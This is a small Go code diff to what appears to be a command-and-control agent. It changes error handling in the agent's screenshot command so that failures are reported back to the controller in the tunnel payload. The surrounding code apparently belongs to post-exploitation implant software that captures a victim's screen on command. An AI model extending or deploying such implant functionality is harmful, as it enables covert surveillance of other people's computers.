@@ -50,9 +50,11 @@ func processCCData(data *MsgTunData) {
 				return
 			}
 
-			out = util.Screenshot()
-			if out == "" {
-				out = "Error: failed to take screenshot"
+			out, err = util.Screenshot()
+			if err != nil {
+				out = fmt.Sprintf("Error: failed to take screenshot: %v", err)
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+				goto send
 			}
 
 			// move to agent root
